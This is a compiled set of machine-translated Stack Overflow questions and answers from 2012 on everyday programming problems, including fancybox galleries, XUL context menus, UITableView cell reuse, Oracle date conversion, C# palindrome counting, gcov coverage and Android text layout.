<link rel="stylesheet" type="text/css" href="http://mysite.com/catalog/source/jquery.fancybox.css?v=2.1.2" media="screen" />
<link rel="stylesheet" type="text/css" href="http://mysite.com/catalog/source/helpers/jquery.fancybox-buttons.css?v=1.0.5" />
<script type="text/javascript" src="http://cdmshopping.com/catalog/source/helpers/jquery.fancybox-buttons.js?v=1.0.5"></script>
<link rel="stylesheet" type="text/css" href="http://mysite.com/catalog/source/helpers/jquery.fancybox-thumbs.css?v=1.0.7" />
<script type="text/javascript" src="http://mysite.com/catalog/source/helpers/jquery.fancybox-thumbs.js?v=1.0.7"></script>
<script type="text/javascript" src="http://mysite.com/catalog/source/helpers/jquery.fancybox-media.js?v=1.0.5"></script>

<script type="text/javascript">
    $(document).ready(function() {
        /*
         *  Simple image gallery. Uses default settings
         */

        $('.fancybox')
        .attr('rel', 'gallery')
        .fancybox({padding : 0});

        /*
         *  Different effects
         */

        // Change title type, overlay closing speed
        $(".fancybox-effects-a").fancybox({
            helpers: {
                title : {
                    type : 'outside'
                },
                overlay : {
                    speedOut : 0
                }
            }
        });

        // Disable opening and closing animations, change title type
        $(".fancybox-effects-b").fancybox({
            openEffect  : 'none',
            closeEffect : 'none',

            helpers : {
                title : {
                    type : 'over'
                }
            }
        });

        // Set custom style, close if clicked, change title type and overlay color
        $(".fancybox-effects-c").fancybox({
            wrapCSS    : 'fancybox-custom',
            closeClick : true,

            openEffect : 'none',

            helpers : {
                title : {
                    type : 'inside'
                },
                overlay : {
                    css : {
                        'background' : 'rgba(238,238,238,0.85)'
                    }
                }
            }
        });

        // Remove padding, set opening and closing animations, close if clicked and disable overlay
        $(".fancybox-effects-d").fancybox({
            padding: 0,

            openEffect : 'elastic',
            openSpeed  : 150,

            closeEffect : 'elastic',
            closeSpeed  : 150,

            closeClick : true,

            helpers : {
                overlay : null
            }
        });

        /*
         *  Button helper. Disable animations, hide close button, change title type and content
         */

        $('.fancybox-buttons').fancybox({
            openEffect  : 'none',
            closeEffect : 'none',

            prevEffect : 'none',
            nextEffect : 'none',

            closeBtn  : false,

            helpers : {
                title : {
                    type : 'inside'
                },
                buttons : {}
            },

            afterLoad : function() {
                this.title = 'Image ' + (this.index + 1) + ' of ' + this.group.length + (this.title ? ' - ' + this.title : '');
            }
        });

        /*
         *  Thumbnail helper. Disable animations, hide close button, arrows and slide to next gallery item if clicked
         */

        $('.fancybox-thumbs').fancybox({
            prevEffect : 'none',
            nextEffect : 'none',

            closeBtn  : false,
            arrows    : false,
            nextClick : true,

            helpers : {
                thumbs : {
                    width  : 50,
                    height : 50
                }
            }
        });

        /*
         *  Media helper. Group items, disable animations, hide arrows, enable media and button helpers.
        */
        $('.fancybox-media')
            .attr('rel', 'media-gallery')
            .fancybox({
                openEffect : 'none',
                closeEffect : 'none',
                prevEffect : 'none',
                nextEffect : 'none',

                arrows : false,
                helpers : {
                    media : {},
                    buttons : {}
                }
            });

        /*
         *  Open manually
         */

        $("#fancybox-manual-a").click(function() {
            $.fancybox.open('http://www.mysite.com/catalog/demo/gooseberry_b.jpg');
        });

        $("#fancybox-manual-b").click(function() {
            $.fancybox.open({
                href : 'iframe.html',
                type : 'iframe',
                padding : 5
            });
        });

        $("#fancybox-manual-c").click(function() {
            $.fancybox.open([
                {
                    href : 'http://www.mysite.com/catalog/demo/gooseberry_b.jpg',
                    title : 'My title'
                }, {
                    href : '2_b.jpg',
                    title : '2nd title'
                }, {
                    href : '3_b.jpg'
                }
            ], {
                helpers : {
                    thumbs : {
                        width: 75,
                        height: 50
                    }
                }
            });
        });

    });
</script>
    <style type="text/css">
        .fancybox-custom .fancybox-skin {
            box-shadow: 0 0 50px #222;
        }
</style>
</head>

<body>
<h3>Online Catalog</h3>
<p>
<a class="fancybox" href="http://www.mysite.com/catalog/demo/gooseberry_b.jpg" data-fancybox-group="gallery" title="Gooseberry Patch"><img src="http://www.mysite.com/catalog/demo/gooseberry_s.jpg" alt="" /></a>
<map name="Map" id="Map">
    <area shape="poly" coords="0,0,0,328,145,328" href="www.google.com" />
                            <area shape="poly" coords="0,0,180,0,328,328,142,328" href="www.google.com" /> 
                    </map>
</p>
</body>
</html> 
```

# javascript - 仅当单击 FireFox 中的图像时才在上下文菜单中显示项目

> ID：13957629
> 
> 赞同：0
> 
> 时间：2012-12-19T17:15:16.297
> 
> 标签：javascript, firefox-addon, xul

[更新] 我可能错误地解释了这个问题：我知道如何隐藏菜单元素 - 但如何测试点击的元素是否可编辑？Chrome 检测到一个可编辑的元素 - 如何在 ff 中实现它。

我试图让我的项目在上下文菜单中仅在单击图像时显示

这是我的`emailpicture.js`

代码：

```
function showHideItems(event)
{   
      var show = document.getElementById("emailImage");
      show.hidden = !(gContextMenu.onImage);
} 
```

和 xul 代码：

```
<?xml version="1.0"?>
<overlay id="emailpicture" xmlns="http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul">
<script type="application/x-javascript" src="chrome://emailpicture/content/emailpicture.js"/>

<menupopup id="contentAreaContextMenu">
  <menuitem id="emailImage" label="Email This Image" onpopupshowing="showHideItems()" oncommand=""/>

</menupopup>

</overlay> 
```

这样做的结果是在浏览器中的每个对象上显示一堆项目（可能是 FireFox 的所有项目）我应该使用该`onpopupshowing`事件吗？还是另一个？我用对了吗？

感谢您的回答

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-20T01:44:04.723

如果您查看[ContextMenu MDN 页面](https://developer.mozilla.org/en-US/docs/XUL/PopupGuide/ContextMenus#Hiding_and_Showing_Menu_Items_based_on_Context)，他们有一个示例。您当前代码的主要问题是您已将*onpopupshowing*放在`<menuitem>`when it should be on 上`<menupopup>`。此外，如果您查看 MDN，[`document.popupNode`](https://developer.mozilla.org/en-US/docs/DOM/document.popupNode)它会说我们鼓励您[`.triggerNode`](https://developer.mozilla.org/en-US/docs/XUL/Property/triggerNode)改用它。此外，查看[popupshowing 事件引用](https://developer.mozilla.org/en-US/docs/Mozilla_event_reference/popupshowing)，我们看到它有一个`.target`，但不清楚这是`<menupopup>`（我在下面假设）、被单击的节点还是其他东西（参见代码中的注释）。

以下代码利用了上述内容并附加了侦听器[`.addEventListener`](https://developer.mozilla.org/en/docs/DOM/element.addEventListener)，以确保不与可能使用*onpopupshowing*属性的任何其他内容发生冲突。

在你的*emailpicture.js*

```
// First define listener
function showHideItems(e) {
    var menupopup = e.target, // I believe `.target` is the <menupopup>, otherwise use `this`. 
        triggerNode = menupopup.triggerNode, // get node that was clicked to open context menu
        triggerIsImage = (triggerNode instanceof Components.interfaces.nsIImageLoadingContent && triggerNode.currentURI),
          // test if it is an image (as from MDN, I would've gone with `.nodeType` and `.nodeName` checks?)
        elmToHide = menupopup.getElementById('emailImage');
    if(elmToHide)
        elmToHide.hidden = !triggerIsImage;
}
// Then attach it to <menupopup>, remember the element has to exist before you can do this so you might want to wait for DOMContentLoaded
document.getElementById('contentAreaContextMenu')
    .addEventListener('popupshowing', showHideItems, false); 
```

然后对于 XUL 不包括属性*onpopupshowing*。

我会指出我没有对此进行测试，所以如果它不起作用，首先检查偶数是否被触发，然后检查`.target`是否符合我的假设（将来可能会为其他人澄清 MDN）。

# ios - iOS UITableView CheckMark出现在每一行

> ID：13957630
> 
> 赞同：0
> 
> 时间：2012-12-19T17:15:17.967
> 
> 标签：ios, uitableview, nsmutablearray

我试图让我的应用程序中的单元格仅在其标题与存储在 NSUserDefaults 中的 NSMutableArray 中的单词匹配的行上显示复选标记。我现在的问题是它在每个应用程序上都显示一个复选标记......即使是该行与任何内容都不匹配的应用程序。这是我的代码和控制台日志。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    static NSString *CellIdentifier = @"Cell";  

    Cell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {  
        cell = [[Cell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier];
    }
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];

    RSSEntry *entry = [_allEntries objectAtIndex:indexPath.row];
NSArray *rowsarray = [defaults objectForKey:@"checkedrows"];
    NSLog(@"ORIGINAL%@", rowsarray);
    NSPredicate *predicate = [NSPredicate predicateWithFormat: @"SELF contains[cd] %@",  entry.date];
    NSArray *filteredArray = [rowsarray filteredArrayUsingPredicate: predicate];
NSString *myString = [filteredArray componentsJoinedByString:@""];
    NSLog(@"The array %@", filteredArray);
    NSLog(@"The string %@", myString);

    if([entry.date isEqualToString:myString]) {
        cell.accessoryType = UITableViewCellAccessoryCheckmark;

    }

        UIFont *cellFont = [UIFont fontWithName:@"Papyrus" size:19];
        UIFont *cellFont2 = [UIFont fontWithName:@"Papyrus" size:17];
        cell.textLabel.text = entry.date;
        cell.detailTextLabel.text = entry.articleTitle;
    cell.detailTextLabel.textColor = [UIColor blackColor];

        cell.textLabel.font = cellFont;
        cell.detailTextLabel.font = cellFont2;

    return cell;
} 
```

控制台日志：

```
2012-12-20 11:02:53.793 5MWG[3615:c07] ORIGINAL(
    "Day 1: "
)
2012-12-20 11:02:53.794 5MWG[3615:c07] The array (
    "Day 1: "
)
2012-12-20 11:02:53.794 5MWG[3615:c07] The string Day 1: 
2012-12-20 11:06:23.851 5MWG[3615:c07] 2
2012-12-20 11:06:23.852 5MWG[3615:c07] ORIGINAL(
    "Day 1: "
)
2012-12-20 11:06:23.852 5MWG[3615:c07] The array (
)
2012-12-20 11:06:23.852 5MWG[3615:c07] The string 
2012-12-20 11:06:23.854 5MWG[3615:c07] 2
2012-12-20 11:06:23.854 5MWG[3615:c07] ORIGINAL(
    "Day 1: "
)
2012-12-20 11:06:23.855 5MWG[3615:c07] The array (
    "Day 1: "
)
2012-12-20 11:06:23.855 5MWG[3615:c07] The string Day 1: 
```

如您所见，返回的唯一字符串是 Day 1:。但是，即使 entry.date = Day 2: 的行也显示复选标记。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:21:21.920

我没有仔细查看您的代码，但是如果您使用重用标识符出队并且您没有将 cell.accessoryType 设置为 none，那么过去检查过的每个回收单元将来都会进行检查。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:17:45.820

您应该添加一个`else`，或将其重写`if`为条件，如下所示：

```
cell.accessoryType = [entry.date isEqualToString:myString]
?   UITableViewCellAccessoryCheckmark
:   UITableViewCellAccessoryNone; 
```

否则，带有复选标记的单元格将在“回收”后永久保留附件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T17:17:39.330

你必须写：

```
if([entry.date isEqualToString:myString]) {
    cell.accessoryType = UITableViewCellAccessoryCheckmark;
} else {
    cell.accessoryType = UITableViewCellAccessoryNone;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:18:36.057

这应该有帮助

```
if([entry.date isEqualToString:myString]) {
    cell.accessoryType = UITableViewCellAccessoryCheckmark;

}else
{
    cell.accessoryType = UITableViewCellAccessoryNone;
} 
```

# html - 一个页面上有多个视频是锚点，如何停止覆盖视频控件的锚点？

> ID：13957631
> 
> 赞同：0
> 
> 时间：2012-12-19T17:15:33.160
> 
> 标签：html, video, controls, anchor

我有一页视频，它们在页面上相互锚定。因此，如果您单击第一个视频，它会向下滑动到下一个，依此类推。但是，由于它们是锚点，因此无法单击控件。我怎样才能解决这个问题？

这是页面[http://kimcolemanprojects.com/djangolive_1.html](http://kimcolemanprojects.com/djangolive_1.html)

谢谢你的帮助。

安吉拉

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T21:43:40.757

这个怎么样？

HTML：

```
<li>
<a href="#"></a>
<video></video>
</li> 
```

CSS：

```
li { position: relative; }
li a { position: absolute; top: 0; left: 0; width: 640; height: 33px; }
li video { position: absolute; top: 0; left: 0; } 
```

这样，a 标签将覆盖视频，但不会覆盖底部的播放器控件。

# javascript - 在标记之前和标记之前包含 JavaScript 有什么区别吗？

> ID：13957632
> 
> 赞同：4
> 
> 时间：2012-12-19T17:15:38.917
> 
> 标签：javascript, html, optimization

> **可能重复：**
> [将 <script> 标签放在 </body> 标签之后是错误的吗？](https://stackoverflow.com/questions/3037725/is-it-wrong-to-place-the-script-tag-after-the-body-tag)

```
//scripts
</body>
</html> 
```

或者

```
</body>
//scripts
</html> 
```

我知道这是一个愚蠢的问题，但这两种方法之间有什么区别。我读过书在`</body>`标签之前做，但实际上我看到人们在`</html>`标签之前做。我的直觉和目前的调查结果表明，我认为这无关紧要，但由于我是 Web 开发的新手，所以我总是第二次猜测我的工作，因为可能有一些我不知道的事情。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:18:40.217

注释是正确的：`<script>`在`head`或`body`不是有效的 HTML 之外。

[这是相关的规范](http://www.w3.org/html/wg/drafts/html/master/the-root-element.html#the-html-element)

> 内容模型
> 
> ```
> A head element followed by a body element. 
> ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:23:14.650

我不是专家，但根据我的经验，只要您的 JS 在 header 或 body 标记中，放置 JS 的位置并没有太大的区别。

我和我的同事总是将我们的 JS 放在 header 标签中（为了可读性和一致性）。但是我已经读过（[这里](https://stackoverflow.com/questions/196702/where-to-place-javascript-in-a-html-file)和[这里](http://robertnyman.com/2008/04/23/where-to-include-javascript-files-in-a-document/)），为了获得最佳性能，您应该将 JS 放在关闭 BODY 标记之前。同样，根据我的经验，我没有注意到主要的性能差异。

# oracle10g - Oracle：更新表中的日期列

> ID：13957633
> 
> 赞同：0
> 
> 时间：2012-12-19T17:15:42.853
> 
> 标签：oracle10g

以下是我抛出错误的 Oracle 更新查询——

更新表 Set col1 = To_date(:dateFill, 'mm/dd/yyyy hh24:mi:ss') 其中 Fil1 = :ID;

dateFill = 01/05/2012，ID= 15

该语句正在一个过程中执行，

错误 -:ORA-01722: 无效号码（日期字段）

有人能告诉我为什么'select To_date('01/05/2012 00:00:00', 'mm/dd/yyyy hh24:mi:ss') from dual;' 给我像'05-JAN-2012 00:00:00'这样的结果。？？？

请给我一些答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:22:00.283

如果 dateFill = 01/05/2012，为什么要指定包含“hh24:mi:ss”的日期格式？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:23:36.380

尝试将字符串转换为数字时出现 ORA-01722 错误，但无法将字符串转换为有效数字。有效数字包含数字“0”到“9”，可能有一个小数点，字符串开头或结尾的符号（+ 或 -），或者“E”或“e”（如果它是浮点数）科学计数法中的点数）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:27:24.787

to_date 始终与“字符”一起使用，即

```
to_date(char[,'format'[,nls_lang]) 
```

您的变量`'dateFill'`是数字数据类型。`Cast`或者`convert`这个 'dateFill' 字段到 varchar 中，一切都会奏效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:48:38.083

> Can someone tell me why is 'select To_date('01/05/2012 00:00:00', 'mm/dd/yyyy hh24:mi:ss') from dual;' giving me result like '05-JAN-2012 00:00:00'.???

how a date displays is down to your client / Nls date format setting:

```
SQL> select To_date('01/05/2012 00:00:00','mm/dd/yyyy hh24:mi:ss') from dual;

TO_DATE('01/05/20120
--------------------
05-jan-2012 00:00:00

SQL> alter session set nls_date_format='mm/dd/yyyy hh24:mi:ss';

Session altered.

SQL> select To_date('01/05/2012 00:00:00','mm/dd/yyyy hh24:mi:ss') from dual;

TO_DATE('01/05/2012
-------------------
01/05/2012 00:00:00

SQL> 
```

# javascript - Chrome - 在函数参数中声明变量

> ID：13957643
> 
> 赞同：1
> 
> 时间：2012-12-19T17:16:13.240
> 
> 标签：javascript, function, google-chrome, variables

我遇到了一个非常烦人的错误，我在 Google 上找不到任何东西。

以下代码适用于 Firefox，但 Chrome 返回错误 'Uncaught SyntaxError: Unexpected token ='

```
test = function(test = 'test'){}; 
```

我的 Chrome 版本是 23.0.1271.97 - 知道如何解决这个问题吗？

谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:25:28.070

它不是“声明变量”——而是被描述为“为函数的参数设置默认值”。考虑一下：

```
var x = 3;
var test = function(x = 4){
  console.log(x)
};
console.log(x); // 3
test();         // 4
test(5);        // 5 
```

换句话说，`x`在该函数表达式中声明的是该函数的局部变量。

它可能很有用，同意，但目前 Firefox 是*唯一*支持此功能的浏览器（ES6 草案规范的一部分）。

更准确地说，它只是 Firefox 15+，如[本页](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/default_parameters)所示。

# iphone - 在 prefix.pch 中确定设备类型

> ID：13957645
> 
> 赞同：0
> 
> 时间：2012-12-19T17:16:16.583
> 
> 标签：iphone, ios, ipad

我正在构建一个通用应用程序，并在 prefix.pch 中包含以下宏，以帮助快速识别类中的设备类型：

```
#define IS_IPAD UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad 
```

我很困惑为什么会这样。我的理解是 prefix.pch 是预编译的，因此 IS_IPAD 变量的值是在编译时设置的，而不是在运行时设置的，因此该值似乎总是针对编译应用程序的设备？或者是为 iPhone 和 iPad 编译的通用应用程序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:27:28.350

宏就像编译期间的全局搜索和替换。编译时，作为预处理的一部分，每个实例都会`IS_IPAD`被逐字替换。`UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad`然后编译文件。

因此，您最终会在代码中进行所需的运行时检查。使用此宏只会减少您输入的次数。

# c# - 使用 C# 检测段落中的单词回文

> ID：13957647
> 
> 赞同：2
> 
> 时间：2012-12-19T17:16:34.213
> 
> 标签：c#, palindrome

我想做一个程序，旨在统计段落中回文单词的数量及其出现次数

规则和假设：

1.  输入：用户可以输入包含尽可能多的句子的段落。每个单词用空格分隔，每个句子用句点分隔。
2.  输出：在输入中找到的回文词列表及其出现次数。
3.  单词之前或之后的标点将被忽略，而单词内部的标点将被计算在内。回文也忽略字母大小写。一个。我有一辆本田思域。Civicis palindrome，词后的标点符号被忽略。湾。我的小弟弟正在睡觉。li'l 不是回文，因为单词里面有一个标点符号。

样本输入：

奥托想养一只狗。他走上街，正要走进宠物店，就看到门上挂着“禁止携带宠物”的牌子。奥托在宠物店看到了很多动物。他看到了鸟。他看到了松鼠。他看到了变色龙。他看到了狗。“那条狗多少钱？” 奥托说。“十美元，”男人说。奥托给了那个男人腱。奥托买了狗。这只狗和奥托一起走回家。现在奥托有一条狗。“感谢上帝，我现在有了一只狗，”他对自己说。

样本输出：Otto = 7 A = 5 Sees = 6

我的代码是：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace PalindromeProgram
{
    class Program
    {
        static void Main(string[] args)
        {
            int i = 0;
            Console.WriteLine("Enter a String"); 
            string s = Console.ReadLine();
            string words = s.ToLower();
            string[] hasil = words.Split(' ');
            foreach (string temp in hasil)
            {
                string str = string.Empty;
                int x = temp.Length;

                for (int y = x - 1; y >= 0; y--)
                {
                    str = str + temp[y];
                }

                int count = 0;
                if (str == temp)
                {
                    count++;
                    Console.WriteLine(temp + " is palindrome = " + count);
                }
                i++;
            }
        }
    }
} 
```

以及我的代码的输出结果，当我放段落时：

奥托想养一只狗。他走上街，正要走进宠物店，就看到门上挂着“禁止携带宠物”的牌子。奥托在宠物店看到了很多动物。他看到了鸟。他看到了松鼠。他看到了变色龙。他看到了狗。“那条狗多少钱？” 奥托说。“十美元，”男人说。奥托给了那个男人腱。奥托买了狗。这只狗和奥托一起走回家。现在奥托有一条狗。“感谢上帝，我现在有了一只狗，”他对自己说。

我的输出程序是：

otto 是回文 = 1 a 是回文 = 1 otto 是回文 = 1 sees 是回文 = 1

我想要这样的输出程序：

奥托词 = 7，词 A = 5，词 Sees = 6

请修复我的输出结果...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:32:49.223

想象一下，您通过管道通过以下步骤处理文本：

1.  将文本拆分为单词
2.  找到回文
3.  将相同的单词分组到桶中
4.  使用 word 将存储桶映射到投影，并在存储桶中计数
5.  将投影提取到列表中
6.  然后将该列表输出到控制台

.

```
var s = @"<<< your input string here >>>";

var result = Regex.Matches(s, @"\w+").Cast<Match>() //1
        .Select(m => m.Value.ToLower()) //1
        .Where(w => String.Join("", w.Reverse()) == w) //2
        .GroupBy(w => w) //3
        .Select(g => new {Word = g.Key, Count = g.Count()}) //4
        .ToList(); //5

result.ForEach(Console.WriteLine); //6 
```

输出：

```
{ Word = otto, Count = 7 }
{ Word = a, Count = 5 }
{ Word = sees, Count = 6 } 
```

不确定它是否会涵盖标点符号 - 需要调整正则表达式。会给你的。:) 我想唯一的情况是像`I'll`. 这种情况可以通过将正则表达式模式更改为`\w|'+`（这意味着任何字母或撇号，出现一次或多次）来处理。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-19T17:39:17.603

有几十种方法可以做到这一点。出于我的考虑，尝试将段落分成单词，删除重复项和每个结果单词，然后检查它是否是回文。

当然，有很多方法可以优化这个算法。

* * *

查看您的代码，唯一的错误（可能是此问题中*最复杂*的问题）是正确拆分段落。您使用了 string.Split(' ')，这意味着只有由空格分隔的字符序列才会转换为“单词”（数组中的项目）。但是，结果数组可能包含一个项目

> 狗，”</p>

这显然不是一个词。

* * *

有很多方法可以实现正确的拆分。the_joric 答案使用了正则表达式，虽然功能强大，但过于复杂且难以理解，可能会导致错误。

（我并不是说我不会将它用于这个特定的问题；我只是说这对于 C# 新手来说可能是一个太大的飞跃）。

所以我会尝试以其他方式编写解决方案：

让我们为我们的特定**问题领域**定义一个*词*，好吗？对我来说，*单词*是一个或多个仅使用字母的字符序列。所以，“guess”、“what”和“asd”是一个词。但是，“123asd”或“a1s2d3”或“asd123”不是。

 ***另一方面，也许是“asd”。是句号之后的词。因此，让我们遵循**启发式**方法，因为除了字母之外的任何内容都将成为“分隔符”。因此，“123asd”将产生“asd”作为单词，而“a1s2d3”将产生“a”、“b”和“c”。

```
const string validChars = "abcdefghijklmenopqrstuvwxyz";

List<string> GetAllWords(string inputSentence)
{
    var list = new List<string>();

    string word = string.Empty;
    foreach (var c in inputSentence.ToLower())
    {
        if (validChars.IndexOf(c) >= 0)
        {
            word += c;
        }
        else if (word != string.Empty)
        {
            list.Add(word);
            word = string.Empty;
        }
    }

    return list;
} 
```

上面的方法将按照我们的启发式返回一个单词列表。正如我已经说过的那样，它并不完美，但考虑到**格式良好的文本**，它会起作用。用这个算法替换你的“string.Split(...)”，你就可以开始了。***

# performance - 如何在junit test中测试性能？

> ID：13957648
> 
> 赞同：1
> 
> 时间：2012-12-19T17:16:34.823
> 
> 标签：performance, testing, load, system

我有一个具有不同版本的应用程序。我想检查不同版本的性能。但是我在服务器上的资源非常有限 - 有时处理器由其他应用程序加载，有时不是。所以检查执行时间不能产生正确的结果。可能以另一种方式存在吗？例如计算处理器周期数或考虑系统负载等？谢谢。

# linux - gcov 未显示任何覆盖率数据

> ID：13957649
> 
> 赞同：5
> 
> 时间：2012-12-19T17:16:37.437
> 
> 标签：linux, gcov

我正在尝试在 Linux（Ubuntu）上使用 gcov 来查看每一行源代码的执行频率。

我在我的 gcc 编译器和链接器标志中添加了以下标志，

```
CCFLAGS =  -fprofile-arcs -ftest-coverage
LDFLAGS = -fprofile-arcs -lgcov 
```

但是在编译并运行程序后，我没有看到 *.gcda 文件被创建。结果，当我跑步时

```
gcov  --object-directory <path to the *.gcno/*.gcda files> myfile.cpp 
```

显示错误：

```
myfile.gcda:cannot open data file, assuming not executed
File '../../../../../code/myfile.cpp'
Lines executed:0.00% of 2625 
```

我是不是错过了什么。如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-20T20:58:14.257

您可以在代码中使用 __gcov_flush() 方法。您将需要从注册的信号处理程序中调用它。

看：

[https://www.osadl.org/fileadmin/dam/interface/docbook/howtos/coverage.pdf](https://www.osadl.org/fileadmin/dam/interface/docbook/howtos/coverage.pdf)

使用它，您可以保持服务运行并在需要转储覆盖数据时发出“kill”。

希望有帮助....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-21T14:51:51.990

确保 gcov 和 gcc 的版本相同 :)，这是许多人无法检查的地方。

```
$gcc --version
gcc (GCC) 4.1.1
Copyright (C) 2006 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

$ find  /usr/lib/gcc -name libgcov.a
/usr/lib/gcc/x86_64-redhat-linux/4.1.1/32/libgcov.a
/usr/lib/gcc/x86_64-redhat-linux/4.1.1/libgcov.a
/usr/lib/gcc/x86_64-redhat-linux/3.4.6/32/libgcov.a
/usr/lib/gcc/x86_64-redhat-linux/3.4.6/libgcov.a 
```

所以你加载的 gcc 版本应该至少在 libgcov.a 的可用列表中

# authentication - 使用 FOSUserBundle 登录控制器

> ID：13957652
> 
> 赞同：3
> 
> 时间：2012-12-19T17:16:48.967
> 
> 标签：authentication, symfony-2.1, fosuserbundle, autologin

我正在开发一个用户可以使用证书登录的项目。

因此，如果 POST 请求中有有效证书，我想在控制器中登录用户并重定向到主站点。

我正在使用 FOSUserBundle 但没有找到任何解释这是否可能或如何完成的内容。

是否有人已经这样做或知道如何做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-03T09:32:03.240

我终于找到了答案。

```
 $token = new \Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken($user, $pw, "main", array("ROLE_USER"));
    $this->get('security.context')->setToken($token);

    $event = new \Symfony\Component\Security\Http\Event\InteractiveLoginEvent($this->getRequest(), $token);
    $this->get('event_dispatcher')->dispatch('security.interactive_login', $event);

    $user = $this->get('security.context')->getToken()->getUser(); 
```

# android - 在 Android 中使文本向右浮动

> ID：13957656
> 
> 赞同：6
> 
> 时间：2012-12-19T17:17:30.487
> 
> 标签：android, android-layout, text, textview

我正在尝试在 Android 中实现一些文本布局，就像`float="right"`在 HTML 中一样。我有两项文本要放在屏幕的某个区域。我希望其中一个在 TextView 中左对齐，其中一个右对齐，如下所示（其中`|`任一端代表封闭容器）：-

```
| First text item      label | 
```

到目前为止，这听起来很容易：我可以`TextView`在 a 中使用两个 s `RelativeLayout`，将右侧的一个设置为`layout_alignParentRight="true"`or `layout_gravity="right"`。但也存在左侧文本太长而无法放入剩余空间的情况。使用 a`RelativeLayout`它会与右侧文本重叠，但在这种情况下我希望它分成两行：-

```
| This text is way too long  |
|                      label | 
```

同样，如果左侧文本流到多行，我希望右侧文本尽可能适合同一行：-

```
| This text doesn't fit on   |
| one line             label | 
```

因为Android 中的 s 总是矩形的，所以即使我编写了一个 custom `View`，似乎也不可能使最后一个示例与两个s 一起工作。我研究过使用 a让我将所有文本放在一个中，但又是 a ，所以看起来它不能以这种方式将标签放在与左侧文本相同的行上。是否有其他类型的文本跨度可以用来实现这一点，甚至是完全不同的方法？`TextView``Layout``Spannable``TextView``AlignmentSpan``ParagraphStyle`

目前，看来我必须要么将文本放入 HTML 并使用 a `WebView`（不太好，因为视图将进入列表项），要么编写一个类似自定义`TextView`的小部件。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:25:37.357

添加`android:gravity="right"`（不一样`layout_gravity`）到右边，但也添加`android:layout_alignBottom`并引用另一个文本视图的 id。multiline 到 true 等我假设你已经有了。分别保留`alignParentRight`和`alignParentLeft`。

需要明确的是，虽然它们是矩形的，但如果你愿意，它们仍然可以重叠，使用`RelativeLayout`（或`FrameLayout`等）

`android:layout_alignBottom="@id..."`另一种方法，*试试*这个：交换`android:layout_alignParentBottom="true"`右侧文本视图。

 *让第三个示例和第二个示例同时使用一个简单的 RelativeLayout，嗯...*

# extjs - 仅当存储大小为 0 时如何发送 AJAX 请求

> ID：13957657
> 
> 赞同：1
> 
> 时间：2012-12-19T17:17:32.410
> 
> 标签：extjs

如何通过当前存储大小为 0 的条件发送组合框的 AJAX 请求。

基本上我有两个级联的远程组合框，并且都是延迟加载的（无法更改此行为）

我发现即使第二个组合框是基于第一个组合框扩展时的事件级联的，它也会对服务器进行 AJAX 调用（虽然只有第一个扩展）

querymode local 和 autoload 选项将不起作用，因为它会在创建商店时在页面加载时加载组合框。

下面给出的是代码片段。

```
 xtype: 'combo',id='firstcombo', name: 'DEFAULT_VALUE' ,minChars:2, value: decodeHtmlContent('') ,width:200 ,listWidth:500, resizable: true,
 valueField : 'id', displayField: 'id', pageSize: 15,forceSelection:true, enableKeyEvents: true,
 store: new Ext.data.Store({reader: new Ext.data.CFQueryReader({id: 'NAME', 
            fields:[{name:'id', mapping:'id'}]}), 
            fields: [{name:'id', mapping:'id'}], 
            url:'server/ajax/Params'
            }

 }),
 listeners : {
         select:function(combo, record, index) {
            this.setRawValue(decodeHtmlContent(record.get('id')));
            cascadeFields();
        }

 xtype: 'combo',id='secondcombo', name: 'DEFAULT_VALUE' ,minChars:2, value: decodeHtmlContent('') ,width:200 ,listWidth:500, resizable: true,
 valueField : 'id', displayField: 'id', pageSize: 15,forceSelection:true, enableKeyEvents: true,
 store: new Ext.data.Store({reader: new Ext.data.CFQueryReader({id: 'NAME', 
            fields:[{name:'id', mapping:'id'}]}), 
            fields: [{name:'id', mapping:'id'}], 
            url:'server/ajax/Params',
            baseParam:{valuefirst:''}
            },
            listeners: {

                beforeload: function(store, options) {
                    var value = Ext.getCmp('fistcombo').value;
                    Ext.apply(options.params, {

                                valuefirst:value
                            });

                }, 

 }),
 listeners : {
         select:function(combo, record, index) {
            this.setRawValue(decodeHtmlContent(record.get('id')));
        }

function cascadeFields()
{

  var combo = Ext.getCmp('secondcombo');

  if(combo.store)
  {

  var store = combo.store;

  combo.setDisabled(true);
  combo.clearValue('');
  combo.store.removeAll();
  combo.store.load();        
